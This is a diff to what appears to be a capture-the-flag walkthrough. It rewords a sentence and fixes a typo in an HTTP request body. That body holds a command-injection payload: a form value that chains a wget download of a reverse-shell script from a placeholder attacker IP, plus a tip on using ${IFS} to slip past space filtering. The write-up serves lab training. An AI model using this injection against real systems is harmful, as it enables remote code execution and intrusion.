@@ -40,7 +40,7 @@ Well, it seems we have only two open ports: `22 (SSH)` and `80 (HTTP)`.
 
 ## Web Directories Enumeration
 
-Let's start by visiting the homepage of the web server listening on port 80. By inspecting the source page, it seems that there is nothing interesting in there.
+Let's start by visiting the homepage of the web server listening on port 80. Although, by inspecting the source page it seems that there is nothing interesting.
 
 ### Gobuster
 
@@ -167,7 +167,7 @@ Accept-Encoding: gzip, deflate
 Accept-Language: en-GB,en-US;q=0.9,en;q=0.8
 Connection: close
 
-yt_url=;wget${IFS}<attacke_IP>:4343/rev_shell.sh;
+yt_url=;wget${IFS}<attacker_IP>:4343/rev_shell.sh;
 ```
 
 *Caveat*: it's important to add the value of the special var IFS, `${IFS}`, as the space " " character replacement.
